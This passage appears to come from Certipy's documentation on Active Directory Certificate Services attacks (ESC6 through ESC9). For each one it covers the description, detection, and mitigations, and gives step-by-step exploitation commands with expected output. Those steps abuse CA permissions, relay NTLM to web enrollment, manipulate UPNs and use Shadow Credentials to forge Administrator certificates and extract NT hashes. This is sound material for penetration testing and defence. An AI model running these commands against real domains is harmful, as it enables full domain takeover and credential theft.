            [!] Conflicting SIDs found in certificate:
            [!]     SAN URL:            'S-1-5-21-...-500'
            [!]     Security Extension: 'S-1-5-21-...-1106'
            [!] Windows will use the security extension SID for authentication purposes
            [*] Using principal: 'administrator@corp.local'
            [*] Trying to get TGT...
            [-] Object SID mismatch between certificate and user 'administrator'
            [-] Verify that user 'administrator' has object SID 'S-1-5-21-...-1106'
            [-] See the wiki for more information
            ```

            Authentication fails to impersonate `administrator`. The KDC uses the attacker's SID (`S-1-5-21-...-1106`) from the security extension, which does not match the `administrator` account's SID. The TGT obtained would be for `attacker@corp.local`, not `administrator@corp.local`.

4. **Mitigations**

    * **Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` Flag on CA:** This is the primary and most effective mitigation. This flag is controlled by the `EditFlags` registry value under the CA's active policy module configuration key.
        Use `certutil` on the CA server:

        ```bat
        certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
        net stop certsvc
        net start certsvc
        ```

        *(The `-` prefix before `EDITF_ATTRIBUTESUBJECTALTNAME2` removes the flag. Verify the final `EditFlags` value).*
    * **Restrict Enrollment Rights:** If the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag must remain enabled for specific, unavoidable legacy reasons (strongly discouraged), ensure that certificate templates allowing client authentication EKUs are not broadly enrollable by low-privileged users. However, this is a much weaker mitigation due to the CA-wide nature of the flag.

---

## **ESC7: Dangerous Permissions on CA**

1. **Description**

    ESC7 addresses vulnerabilities arising from an attacker obtaining highly privileged permissions directly on a CA object within AD CS or on the CA service itself. These permissions grant significant control over the CA's operations and security. The two primary permissions of concern are:

    * **`Manage CA` (CA Administrator/ManageCa):** This permission grants extensive control over the CA, including the ability to modify its configuration (e.g., which certificate templates are published), assign CA roles (including Certificate Manager/Officer, if needed), start/stop the CA service, and manage CA security. **This is the core permission that ESC7 often revolves around.**
    * **`Manage Certificates` (Certificate Manager/Officer):** This permission allows a user to approve or deny pending certificate requests and to revoke issued certificates.

    While `Manage Certificates` alone might have limited direct paths to privilege escalation without a pre-existing pending request for a privileged certificate, obtaining `Manage CA` rights is extremely dangerous. An attacker with `Manage CA` can often grant themselves other necessary CA roles or directly manipulate the CA configuration to facilitate the issuance of unauthorized certificates, leading to full domain compromise. For instance, having `Manage CA` might enable an attacker to also perform actions typically associated with a Certificate Officer, such as approving a request, especially if they can assign that role to themselves. The exploitation method detailed below demonstrates how `Manage CA` rights are leveraged to enable a specific template and then ensure a certificate request is processed, effectively leading to arbitrary certificate issuance using the built-in `SubCA` template.

2. **Identification with Certipy**

    Certipy's `find` command can enumerate the permissions on CAs. For ESC7, the critical finding is identifying if non-standard administrative accounts or overly broad groups hold the powerful `Manage CA` right.

    **Expected Output Snippet:**

    Under the "Certificate Authorities" section in the `certipy find` output, examine the "Access Rights", specifically for `ManageCa`. The `[+] User ACL Principals` field will indicate if the current user context has `ManageCa` rights.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
        ...
        Permissions
          Owner                             : CORP.LOCAL\Administrators
          Access Rights
            ManageCa                        : CORP.LOCAL\Authenticated Users
                                              CORP.LOCAL\Domain Admins
                                              CORP.LOCAL\Enterprise Admins
                                              CORP.LOCAL\Administrators
            ...
        [+] User Enrollable Principals      : CORP.LOCAL\Authenticated Users
        [+] User ACL Principals             : CORP.LOCAL\Authenticated Users
        [!] Vulnerabilities
          ESC7                              : User has dangerous permissions.
    ```

    **Key indicators:**

    * Certipy explicitly flags `[!] Vulnerabilities ESC7 : User has dangerous permissions.` when the current user has such rights.
    * The `ManageCa` permission under `Access Rights` is granted to an inappropriate principal, such as `CORP.LOCAL\Authenticated Users` in the example, or any group the attacker is part of.
    * The `[+] User ACL Principals` field confirms that the current user context running Certipy possesses these dangerous permissions (like `ManageCa`) on the CA, often through group membership.

3. **Exploitation with Certipy**

    A powerful method to exploit the `Manage CA` permission involves abusing the default `SubCA` certificate template. This template, intended for issuing certificates to subordinate CAs, allows enrollee-supplied subjects and has very broad EKUs. The core of the attack is using `Manage CA` rights to ensure this template is available and then facilitating the issuance of a certificate through it for a privileged identity.

    The `SubCA` template is notable because it can be used for any purpose and allows the enrollee to specify the subject name. Typically, only administrators can enroll for this template. If not already enabled on the CA, a user with `Manage CA` rights can enable it. The attacker then attempts to request a certificate using `SubCA`, specifying the UPN and SID of a target privileged user (e.g., Administrator). If the attacker lacks direct enrollment rights on `SubCA`, this initial request will be denied but will generate a request ID. The private key associated with this CSR must be saved by the attacker. Leveraging their `Manage CA` capabilities (which includes the ability to manage roles and requests, effectively encompassing officer functions), the attacker can then ensure this request is approved and subsequently retrieve the certificate.

    **Prerequisites:**

    * The attacker (`attacker@corp.local`) has `Manage CA` permission on the target CA (`CORP-CA`).

    **Attack Steps:**

    * **Step 1: (If needed, as facilitated by `Manage CA`) Ensure capability to approve requests.**
        An attacker with `Manage CA` can assign roles. If they need to explicitly act as a Certificate Officer to approve a request, they can add their account to this role.

        ```bash
        certipy ca \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -add-officer 'attacker'
        ```

        This command uses the `Manage CA` privilege to add 'attacker' to the officer role.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Successfully added officer 'attacker' on 'CORP-CA'
        ```

    * **Step 2: (If needed) Ensure the `SubCA` template is enabled on the CA.**
        Using `Manage CA` rights, the attacker ensures the `SubCA` template is published by the target CA.

        ```bash
        certipy ca \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -enable-template 'SubCA'
        ```

        This command uses `Manage CA` to make the `SubCA` template available for requests.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Successfully enabled 'SubCA' on 'CORP-CA'
        ```

    * **Step 3: Submit a certificate request using the `SubCA` template (expected to fail initially if no direct enrollment rights).**
        The attacker requests a certificate for a privileged user (e.g., Administrator) via the `SubCA` template. If the attacker lacks direct enrollment rights on this specific template, the request is denied but a request ID is generated. The associated private key from the CSR must be saved.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'SubCA' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
        Would you like to save the private key? (y/N): y
        [*] Saving private key to '1.key'
        [*] Wrote private key to '1.key'
        [-] Failed to request certificate
        ```

        Note the `Request ID` (e.g., `1`) and that the private key was saved (e.g., to `1.key`).

    * **Step 4: Approve the pending request.**
        The attacker, leveraging the capabilities granted by `Manage CA` (including effective officer functions, possibly via role self-assignment as in Step 1), approves the previously denied request.

        ```bash
        certipy ca \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -issue-request '1'
        ```

        *(Use the `Request ID` from Step 3).*

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Successfully issued certificate request ID 1
        ```

    * **Step 5: Retrieve the issued certificate.**
        The attacker retrieves the now-approved certificate, using the request ID and the private key saved in Step 3.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -retrieve '1'
        ```

        *(Certipy will attempt to find a `.key` file matching the request ID if `-key-file` is not specified).*

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Retrieving certificate with ID 1
        [*] Successfully retrieved certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Loaded private key from '1.key'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The attacker now possesses `administrator.pfx`, a certificate for the Administrator account. This can be used with `certipy auth -pfx administrator.pfx ...` to authenticate and gain privileged access.

4. **Mitigations**

    Certificate Authorities are Tier 0 assets and must be protected with the highest level of security, equivalent to Domain Controllers.

    * **Restrict `Manage CA` and `Manage Certificates` Permission:** This is the most important mitigation. Strictly limit who holds the `Manage CA` and `Manage Certificates` permissions. These rights should only be granted to a minimal number of highly trusted, dedicated PKI administrators. Avoid granting it to broad groups or standard administrative accounts.

---

## **ESC8: NTLM Relay to AD CS Web Enrollment**

1. **Description**

    ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint. These web-based interfaces provide alternative methods for users and computers to request certificates. The primary targets for this attack are:

    * The traditional Web Enrollment pages (typically accessible via `http://<ca_server>/certsrv/` or `https://<ca_server>/certsrv/`).
    * The Certificate Enrollment Web Service (CES) and Certificate Enrollment Policy Web Service (CEP), which offer more modern, RPC/HTTPS-based enrollment methods.

    **Important Note on Certipy's Current Support:** Certipy's `relay` command, when used for ESC8, specifically targets the classic Web Enrollment service, particularly the `/certsrv/certfnsh.asp` endpoint. It does not currently support relaying to CES or CEP endpoints for certificate enrollment, as these services often use different authentication mechanisms or enrollment protocols (like WS-Trust) that are not targeted by this specific NTLM relay module in Certipy.

    The vulnerability exists if these AD CS HTTP(S) web services are configured under the following conditions:

    * **Accept NTLM Authentication:** The web server hosting these services (typically IIS on the CA server or a dedicated web enrollment server) allows NTLM authentication. This is often a default configuration in Windows environments.
    * **Lack NTLM Protections:** The service does **not** enforce NTLM relay protections such as Extended Protection for Authentication (EPA), also known as Channel Binding. Simply using HTTPS is **insufficient** to prevent NTLM relay if EPA is not properly configured and enforced on the web server.

    The attack typically proceeds as follows:

    1. **Coerce Authentication:** The attacker coerces a privileged account to authenticate to a machine controlled by the attacker using NTLM. Common targets for coercion include Domain Controller machine accounts (e.g., using tools like PetitPotam or Coercer, or other RPC-based coercion techniques against MS-EFSRPC, MS-RPRN, etc.) or Domain Admin user accounts (e.g., via phishing or other social engineering that triggers an NTLM authentication).
    2. **Set up NTLM Relay:** The attacker uses an NTLM relay tool, such as Certipy's `relay` command, listening for incoming NTLM authentications.
    3. **Relay Authentication:** When the victim account authenticates to the attacker's machine, Certipy captures this incoming NTLM authentication attempt and forwards (relays) it to the vulnerable AD CS HTTP web enrollment endpoint (e.g., `https://<ca_server>/certsrv/certfnsh.asp`).
    4. **Impersonate and Request Certificate:** The AD CS web service, receiving what it believes to be a legitimate NTLM authentication from the relayed privileged account, processes subsequent enrollment requests from Certipy as that privileged account. Certipy then requests a certificate, typically specifying a template for which the relayed privileged account has enrollment rights (e.g., the "DomainController" template if a DC machine account is relayed, or the default "User" template for a user account).
    5. **Obtain Certificate:** The CA issues the certificate. Certipy, acting as the intermediary, receives this certificate.
    6. **Use Certificate for Privileged Access:** The attacker can now use this certificate (e.g., in a `.pfx` file) with `certipy auth` to authenticate as the impersonated privileged account via Kerberos PKINIT, potentially leading to full domain compromise.

    ESC8 often exploits default IIS configurations where NTLM is enabled and EPA is not, combined with AD CS environments where privileged accounts (like Domain Controllers for enrollment) can enroll for certain certificate templates.

2. **Identification with Certipy**

    Certipy's `find` command inspects the CA's web enrollment services for common NTLM relay vulnerabilities. It will specifically flag if HTTP is enabled for web enrollment (which is inherently insecure for NTLM) or if HTTPS is enabled but does not appear to require Channel Binding (EPA).

    **Expected Output Snippet:**

    Under the "Certificate Authorities" section for the target CA, check the "Web Enrollment" details and the `[!] Vulnerabilities` section.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
        ...
        Web Enrollment
          HTTP
            Enabled                         : False
          HTTPS
            Enabled                         : True
            Channel Binding (EPA)           : False
        ...
        Request Disposition                 : Issue
        ...
        [!] Vulnerabilities
          ESC8                              : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.
    ```

    **Key indicators:**

    * Certipy explicitly flags `[!] Vulnerabilities ESC8 : Web Enrollment is enabled over HTTPS and Channel Binding is disabled.` (or a similar message if HTTP is enabled, e.g., `ESC8 : Web Enrollment is enabled over HTTP.`).
    * Under `Web Enrollment`:
        * `HTTP Enabled : True`.
        * OR `HTTPS Enabled : True` AND `Channel Binding (EPA) : False`.

3. **Exploitation with Certipy**

    Exploiting ESC8 requires two main components:

    1. Coercing a privileged authentication to the attacker's machine.
    2. Relaying this authentication using Certipy to the vulnerable AD CS web enrollment service.

    * **Step 1: Start the Certipy NTLM relay.**
        The attacker starts Certipy in relay mode on a machine they control, configuring it to target the CA's vulnerable web enrollment endpoint.

        * If relaying a Domain Controller account, it's common to specify the `DomainController` template, as DCs typically have enrollment rights for it:

            ```bash
            certipy relay \
                -target 'https://10.0.0.50' -template 'DomainController'
            ```

        * If relaying a user account (and expecting to use the default "User" template, or if the template will be auto-detected based on the user), the template can sometimes be omitted or specified:

            ```bash
            certipy relay -target 'https://10.0.0.50'
            ```

        **Expected Initial Output (Relay Listening):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Targeting https://10.0.0.50/certsrv/certfnsh.asp (ESC8)
        [*] Listening on 0.0.0.0:445
        [*] Setting up SMB Server on port 445
        ```

        Certipy is now listening for incoming SMB connections (a common way to capture NTLM auth via coercion) and is ready to relay to the specified HTTP target.

        > 💡 **Tip**: If you get a 'permission denied' while trying to listen on port 445, you can use the command (on Linux):
        > `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`


    * **Step 2: Coerce authentication from a privileged account to the Certipy relay.**
        The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force the target (e.g., a Domain Controller `DC.CORP.LOCAL` or a privileged user `Administrator`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.

        *(This step is performed using a tool other than Certipy itself)*.

    * **Step 3: Certipy relays the authentication and requests a certificate.**
        Once the victim account authenticates to the attacker's relay, Certipy captures the NTLM negotiation, forwards it to the AD CS web endpoint, and, if successful, attempts to request a certificate using the context of the relayed (privileged) user.

        **Example Output (Relaying a Domain Controller `DC$`):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Targeting https://10.0.0.50/certsrv/certfnsh.asp (ESC8)
        [*] Listening on 0.0.0.0:445
        [*] Requesting certificate for 'CORP\\DC$' based on the template 'DomainController'
        [*] Certificate issued with request ID 1
        [*] Retrieving certificate for request ID: 1
        [*] Got certificate with DNS Host Name 'DC.CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-1001'
        [*] Saving certificate and private key to 'dc.pfx'
        [*] Wrote certificate and private key to 'dc.pfx'
        [*] Exiting...
        ```

        Here, Certipy successfully relayed the `DC$` account's authentication, requested a certificate using the `DomainController` template, and saved it as `dc.pfx`.

        **Example Output (Relaying an Administrator user):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Targeting https://10.0.0.50/certsrv/certfnsh.asp (ESC8)
        [*] Listening on 0.0.0.0:445
        [*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
        [*] Certificate issued with request ID 1
        [*] Retrieving certificate for request ID: 1
        [*] Got certificate with UPN 'Administrator@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        [*] Exiting...
        ```

        Similarly, for a user, Certipy relays the authentication, requests a certificate (defaulting to or auto-detecting a suitable template like "User"), and saves it as `administrator.pfx`.

    * **Step 4: Authenticate using the obtained certificate.**
        The attacker now uses the `.pfx` file obtained via relay to authenticate.

        Using the certificate obtained for the DC (`dc.pfx`):

        ```bash
        certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output (for DC):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN DNS Host Name: 'DC.CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-1001'
        [*] Using principal: 'dc$@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'dc.ccache'
        [*] Wrote credential cache to 'dc.ccache'
        [*] Trying to retrieve NT hash for 'dc$'
        [*] Got hash for 'dc$@corp.local': aad3b435b51404eeaad3b435b51404ee:c2ebebf4389addf861f6cb81d314d5e5
        ```

        Using the certificate obtained for Administrator (`administrator.pfx`):

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output (for Administrator):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'Administrator@CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        In both cases, the attacker successfully obtains a Kerberos TGT and the NTLM hash for the impersonated account.

4. **Mitigations**

    Protecting against NTLM relay attacks on AD CS web enrollment services involves several layers:

    * **Enable Extended Protection for Authentication (EPA):** This is the primary mitigation for IIS-hosted web services like `/certsrv/`. Configure the IIS application pool or site hosting the AD CS web services to require EPA (set to "Required"). This binds the NTLM authentication to the TLS channel, preventing it from being relayed.
    * **Require HTTPS:** Ensure all AD CS web services (Web Enrollment, CES, CEP) are configured to use HTTPS only. Disable HTTP bindings. While HTTPS itself doesn't prevent NTLM relay, it is a prerequisite for effective EPA and encrypts the session data.
    * **Disable NTLM Authentication on Web Services:** If feasible for your environment and client compatibility, disable NTLM authentication entirely on the IIS sites/applications hosting AD CS web services and require Kerberos or other NTLM-relay-resistant authentication methods. This removes the NTLM relay vector for these services.
    * **Disable Unused Web Enrollment Services:** If the classic Web Enrollment feature (`/certsrv/`), CES, or CEP are not actively needed in your environment, disable or uninstall these AD CS role services from the CA or web enrollment server. This reduces the attack surface.
    * **Windows Server 2025 Note:** Installations of AD CS Web Enrollment on Windows Server 2025 are expected to have Extended Protection for Authentication (EPA) enabled by default for new deployments, which is a significant improvement for mitigating this specific attack vector going forward. Existing upgraded systems may need manual configuration.

---

## **ESC9: No Security Extension on Certificate Template**

1. **Description**

    ESC9 vulnerabilities arise when a certificate template is explicitly configured *not* to include the `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) security extension in the certificates it issues. This extension, which contains the requester's SID, was introduced by Microsoft as part of the May 2022 "Certifried" updates (CVE-2022-26923 and KB5014754) to enable "strong certificate mapping". Strong mapping allows DCs to reliably and securely map a presented client certificate to a specific user or computer account in Active Directory using its SID.

    A template can be configured to omit this extension by setting the `CT_FLAG_NO_SECURITY_EXTENSION` flag (value `0x80000`) in its `msPKI-Enrollment-Flag` attribute within Active Directory. If a certificate is issued from such a template:

    * It will lack the primary SID security extension (`szOID_NTDS_CA_SECURITY_EXT`).
    * This forces the KDC during Kerberos PKINIT authentication, or Schannel during TLS authentication, to rely on weaker, legacy mapping methods if the domain is not yet in "Full Enforcement" mode for strong certificate binding. These weaker methods might include mapping based on the UPN or DNS name found in the certificate's SAN.

    The vulnerability of ESC9 becomes exploitable under these conditions:

    * **Domain Controller Certificate Binding Mode:** The `StrongCertificateBindingEnforcement` registry key on Domain Controllers (under `HKLM\SYSTEM\CurrentControlSet\Services\Kdc`) is set to `1` (Compatibility Mode) or `0` (Disabled).
        * In Compatibility Mode (which was the default after the May 2022 patches until February 2025), DCs attempt strong mapping first (using the SID extension). If the SID extension is absent, they fall back to weaker mapping methods based on SAN UPNs or DNS names.
        * If set to `0` (Disabled), strong mapping is not enforced, and weak mappings are allowed.
    * **Client Authentication EKU:** The ESC9 template must allow for client authentication (e.g., include "Client Authentication" EKU).
    * **Enrollment Rights:** An attacker-controlled account must have enrollment rights for this template.

    ESC9 can be exploited in a couple of primary ways:

    1. **With UPN Manipulation (in Compatibility Mode or Disabled Mode):** If an attacker has control over an account's `userPrincipalName` attribute (e.g., through `GenericWrite` permission) and that account can enroll in the ESC9 template, the attacker can:

        * Temporarily change this "victim" account's UPN to match the `sAMAccountName` (or desired UPN) of a target privileged account (e.g., an administrator).
        * Request a certificate as the victim account. The issued certificate will contain the manipulated UPN but will lack the SID security extension (due to ESC9).
        * Revert the UPN change on the victim account.
        * Use the obtained certificate to authenticate. The KDC, finding no SID extension and operating in compatibility mode, will use the UPN from the certificate's SAN. Since this UPN now matches the target privileged account, the attacker impersonates that account.

    2. **Combined with ESC6 (CA allows SAN specification):** This is a more powerful combination. If the CA is also vulnerable to ESC6 (meaning the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set on the CA, allowing requesters to specify arbitrary SANs via request attributes), an attacker can:

        * Request a certificate from the ESC9 template (ensuring no SID security extension is present).
        * Simultaneously use the ESC6 vulnerability to inject the target's UPN *and* the target's SID (formatted as a special SAN URL: `URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`) into the certificate request.
        * The issued certificate will lack the SID security extension (due to ESC9) but will contain the attacker-supplied SAN SID URL (due to ESC6).
        * In this case, the KDC (even in "Full Enforcement" mode, `StrongCertificateBindingEnforcement=2`) will use the SID from the SAN URL for authentication, leading to impersonation.

2. **Identification with Certipy**

    Certipy's `find` command identifies templates configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in their `msPKI-Enrollment-Flag` attribute.

    **Expected Output Snippet:**

    Look for the `Enrollment Flag` field containing `NoSecurityExtension` and the `ESC9` vulnerability flag for a template.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      0
        Template Name                       : VulnTemplate
        Display Name                        : VulnTemplate
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : True
        ...
        Enrollment Flag                     : NoSecurityExtension
        ...
        Extended Key Usage                  : Client Authentication
                                              Secure Email
                                              Encrypting File System
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC9                              : Template has no security extension.
        [*] Remarks
          ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
    ```

    **Key indicators:**

    * `[!] Vulnerabilities ESC9 : Template has no security extension.` This explicitly flags the ESC9 condition.
    * The `Enrollment Flag` field for the template includes `NoSecurityExtension`. This confirms the critical template setting.
    * The `[*] Remarks ESC9 : Other prerequisites may be required...` correctly notes that exploitability often depends on the DC's certificate binding mode or the presence of other vulnerabilities like ESC6.
    * The template must also have `Client Authentication : True` (or a similar EKU) and the attacker must have enrollment rights (`[+] User Enrollable Principals`).

3. **Exploitation with Certipy**

    Exploitation methods vary based on DC configuration and whether ESC6 is also present.

    **Scenario A: UPN Manipulation (Requires `StrongCertificateBindingEnforcement = 1` (Compatibility) or `0` (Disabled) on DCs, and attacker has write access to a "victim" account's UPN)**

    Attacker (`attacker@corp.local`) has `GenericWrite` permission over a "victim" account (`victim@corp.local`). The `victim` account can enroll in the ESC9 "VulnTemplate". The target for impersonation is `administrator@corp.local`.

    * **Step 1: Read initial UPN of the victim account (Optional - for restoration).**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -user 'victim' \
            read
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Reading attributes for 'victim':
            cn                                  : Victim
            userPrincipalName                   : victim@CORP.LOCAL
        ...
        ```

    * **Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.**
        The `sAMAccountName` of the default administrator is typically "Administrator". The UPN needs to be resolvable to the target account.

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'administrator' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : administrator
        [*] Successfully updated 'victim'
        ```

        Now, the `victim` account has its UPN temporarily set to `administrator`.

    * **Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**
        If the attacker doesn't have the victim's current credentials but has permissions like `GenericWrite` or `WriteDACL` (which often accompany the ability to change UPN), they might be able to perform a Shadow Credentials attack to get usable credentials (like an NTLM hash or Kerberos keys/ccache) for the victim account.

        ```bash
        certipy shadow \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -account 'victim' \
            auto
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)
        ...
        [*] Saving credential cache to 'victim.ccache'
        [*] Wrote credential cache to 'victim.ccache'
        [*] NT hash for 'victim': fc525c9683e8fe067095ba2ddc971889
        ```

    * **Step 4: Request a certificate as the "victim" user from the ESC9 template.**
        The attacker, now using the victim's context (e.g., with credentials obtained in Step 3), requests the certificate.
        Set the Kerberos credential cache environment variable (shell command, if using ccache):

        ```bash
        export KRB5CCNAME=victim.ccache
        ```

        Then request the certificate:

        ```bash
        certipy req \
            -k -dc-ip '10.0.0.100' \
            -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
            -template 'VulnTemplate'
        ```

        * `-k`: Use Kerberos authentication (leveraging the ccache from `KRB5CCNAME`).
        * The UPN for the request will be `administrator` (from the victim account's current UPN).
        * The certificate will be issued based on "VulnTemplate", which has no SID security extension.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate has no object SID
        [*] Try using -sid to set the object SID or see the wiki for more details
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The output shows `Got certificate with UPN 'administrator@corp.local'`. The message `Certificate has no object SID` indicates the absence of the security extension, confirming the ESC9 condition. The certificate is saved to `administrator.pfx`.

    * **Step 5: Revert the "victim" account's UPN.**
        To clean up, the attacker changes the victim's UPN back to its original value.

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : victim@corp.local
        [*] Successfully updated 'victim'
        ```

    * **Step 6: Authenticate as the target administrator.**
        The attacker uses the `administrator.pfx` (which contains the UPN "administrator" but no SID security extension).

        ```bash
        certipy auth \
            -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
            -username 'administrator' -domain 'corp.local'
        ```

        * `-username 'administrator' -domain 'corp.local'`: These help Certipy explicitly target the `administrator@corp.local` principal for authentication, as the certificate's subject information might be minimal or ambiguous without a full UPN.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The attacker successfully obtains a TGT and NT hash for `administrator@corp.local`. Note the `Certificate identities` list only shows `SAN UPN: 'administrator'`, confirming the absence of a SID security extension or a SAN URL SID in this specific certificate.

    **Scenario B: ESC9 Combined with ESC6 (CA allows SAN specification via attributes)**
    This method is more robust as it works even if DCs are in Full Enforcement mode (`StrongCertificateBindingEnforcement = 2`). ESC9 ensures the primary SID security extension is missing, and ESC6 allows the attacker to inject a target SID directly into the SAN using the special URL format.

    * **Step 1: Request certificate from ESC9 template, using ESC6 to specify target UPN and SID in SAN.**
        Attacker `attacker@corp.local` requests the certificate from "VulnTemplate" (the ESC9 template).

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'VulnTemplate' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        * `-template 'VulnTemplate'`: The template that doesn't add the SID security extension.
        * `-sid 'S-1-5-21-...-500'`: The SID of the target administrator. Certipy will use this to craft the `URL=tag:microsoft.com,2022-09-14:sid:<VALUE>` SAN entry because ESC6 is active on the CA.
        * `-upn 'administrator@corp.local'`: The UPN of the target administrator for the SAN.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
